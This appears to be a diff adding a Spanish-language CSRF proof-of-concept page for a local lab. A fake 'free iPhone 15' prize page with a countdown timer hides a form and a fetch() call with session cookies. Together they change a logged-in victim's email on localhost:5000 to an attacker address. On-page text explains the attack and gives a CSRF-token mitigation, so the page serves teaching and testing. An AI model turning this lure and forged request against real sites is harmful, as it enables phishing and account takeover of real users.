@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡GANA UN iPhone 15 GRATIS! 🎁</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 50px;
+            max-width: 600px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+        
+        h1 {
+            font-size: 42px;
+            color: #f5576c;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .prize {
+            font-size: 80px;
+            margin: 30px 0;
+            animation: rotate 3s infinite;
+        }
+        
+        @keyframes rotate {
+            0%, 100% { transform: rotate(-10deg); }
+            50% { transform: rotate(10deg); }
+        }
+        
+        .subtitle {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+        
+        .features {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            text-align: left;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #333;
+        }
+        
+        .feature-item::before {
+            content: "✓";
+            background: #28a745;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+        
+        .cta-button {
+            background: linear-gradient(135deg, #f5576c 0%, #f093fb 100%);
+            color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.4);
+            transition: all 0.3s;
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .cta-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 15px 40px rgba(245, 87, 108, 0.6);
+        }
+        
+        .countdown {
+            background: #fff3cd;
+            border: 2px dashed #ffc107;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 30px;
+            font-size: 18px;
+            color: #856404;
+            font-weight: 600;
+        }
+        
+        .hidden-form {
+            display: none;
+        }
+        
+        .attack-info {
+            margin-top: 40px;
+            padding: 25px;
+            background: #f8d7da;
+            border: 2px solid #f5c6cb;
+            border-radius: 15px;
+            text-align: left;
+        }
+        
+        .attack-info h3 {
+            color: #721c24;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .attack-info p {
+            color: #721c24;
+            margin-bottom: 10px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .attack-info code {
+            background: white;
+            padding: 12px;
+            border-radius: 8px;
+            display: block;
+            margin: 10px 0;
+            font-size: 12px;
+            color: #c7254e;
+            overflow-x: auto;
+        }
+        
+        .status {
+            margin-top: 30px;
+            padding: 20px;
+            background: #d4edda;
+            border: 2px solid #c3e6cb;
+            border-radius: 10px;
+            color: #155724;
+            font-weight: 600;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>¡FELICIDADES! 🎉</h1>
+        <div class="prize">📱</div>
+        <div class="subtitle">Has sido seleccionado para ganar un iPhone 15 Pro Max GRATIS</div>
+        
+        <div class="features">
+            <div class="feature-item">iPhone 15 Pro Max 256GB</div>
+            <div class="feature-item">Envío completamente GRATIS</div>
+            <div class="feature-item">Sin costos ocultos</div>
+            <div class="feature-item">Solo 3 ganadores en tu ciudad</div>
+        </div>
+        
+        <button class="cta-button" onclick="claimPrize()">
+            ¡RECLAMAR MI PREMIO AHORA! 🎁
+        </button>
+        
+        <div class="countdown">
+            ⏰ Esta oferta expira en: <span id="timer">05:00</span> minutos
+        </div>
+        
+        <!-- ========================================
+             CSRF ATTACK FORM (HIDDEN)
+             ======================================== -->
+        <form id="csrfForm" class="hidden-form" method="POST" action="http://localhost:5000/api/profile/email">
+            <input type="hidden" name="email" value="atacante@malicious.com">
+        </form>
+        
+        <div id="status" class="status"></div>
+        
+        <!-- Attack Information -->
+        <div class="attack-info">
+            <h3>🔴 ESTO ES UN ATAQUE CSRF </h3>
+            <p><strong>¿Qué está pasando?</strong></p>
+            <p>Al hacer clic en el botón, se ejecuta automáticamente un formulario oculto que envía una petición POST al servidor vulnerable:</p>
+            <code>&lt;form method="POST" action="http://localhost:5000/api/profile/email"&gt;
+  &lt;input name="email" value="atacante@malicious.com"&gt;
+&lt;/form&gt;</code>
+            
+            <p style="margin-top: 15px;"><strong>Resultado:</strong></p>
+            <p>Si la víctima tiene una sesión activa en http://localhost:5000, su email será cambiado a "atacante@malicious.com" sin su consentimiento.</p>
+            
+            <p style="margin-top: 15px;"><strong>¿Por qué funciona?</strong></p>
+            <p>El endpoint <code>/api/profile/email</code> NO valida tokens CSRF, permitiendo que peticiones forjadas desde otros sitios sean procesadas.</p>
+            
+            <p style="margin-top: 15px; color: #155724; background: #d4edda; padding: 10px; border-radius: 6px;">
+                <strong>✓ Mitigación:</strong> Implementar tokens CSRF que se validen en cada petición sensible.
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        // Countdown timer
+        let timeLeft = 300; // 5 minutos
+        const timerElement = document.getElementById('timer');
+        
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }
+        }, 1000);
+        
+        // ========================================
+        // CSRF ATTACK EXECUTION
+        // ========================================
+        async function claimPrize() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+            statusDiv.style.background = '#fff3cd';
+            statusDiv.style.borderColor = '#ffc107';
+            statusDiv.style.color = '#856404';
+            statusDiv.textContent = '⏳ Ejecutando ataque CSRF...';
+            
+            try {
+                // Intentar CSRF attack usando fetch (JSON)
+                const response = await fetch('http://localhost:5000/api/profile/email', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    credentials: 'include', // Incluir cookies de sesión
+                    body: JSON.stringify({
+                        email: 'atacante@malicious.com'
+                    })
+                });
+                
+                if (response.ok) {
+                    statusDiv.style.background = '#d4edda';
+                    statusDiv.style.borderColor = '#c3e6cb';
+                    statusDiv.style.color = '#155724';
+                    statusDiv.innerHTML = `
+                        ✅ <strong>ATAQUE CSRF EXITOSO!</strong><br><br>
+                        El email de la víctima ha sido cambiado a: <code>atacante@malicious.com</code><br><br>
+                        <small>En un ataque real, el atacante ahora podría:</small><br>
+                        <small>1. Solicitar recuperación de contraseña al nuevo email</small><br>
+                        <small>2. Tomar control total de la cuenta</small><br>
+                        <small>3. Acceder a información sensible</small>
+                    `;
+                } else {
+                    const data = await response.json();
+                    statusDiv.style.background = '#f8d7da';
+                    statusDiv.style.borderColor = '#f5c6cb';
+                    statusDiv.style.color = '#721c24';
+                    statusDiv.textContent = `⚠️ Ataque bloqueado: ${data.error || 'Usuario no autenticado'}`;
+                }
+            } catch (error) {
+                statusDiv.style.background = '#f8d7da';
+                statusDiv.style.borderColor = '#f5c6cb';
+                statusDiv.style.color = '#721c24';
+                statusDiv.innerHTML = `
+                    ⚠️ <strong>Error de CORS o víctima no autenticada</strong><br><br>
+                    <small>Para que el ataque funcione:</small><br>
+                    <small>1. La víctima debe estar logueada en http://localhost:5000</small><br>
+                    <small>2. El servidor debe aceptar peticiones cross-origin (CORS)</small><br>
+                    <small>3. El endpoint no debe validar token CSRF</small>
+                `;
+            }
+        }
+        
+        // Instrucciones al cargar
+        console.log('========================================');
+        console.log('CSRF ATTACK PoC - Instrucciones:');
+        console.log('========================================');
+        console.log('1. Abre http://localhost:5000 en OTRA PESTAÑA');
+        console.log('2. Inicia sesión (victim@example.com / password123)');
+        console.log('3. Vuelve a esta página');
+        console.log('4. Haz clic en "RECLAMAR MI PREMIO AHORA"');
+        console.log('5. Observa cómo el email cambia sin autorización');
+        console.log('========================================');
+    </script>
+</body>
+</html>
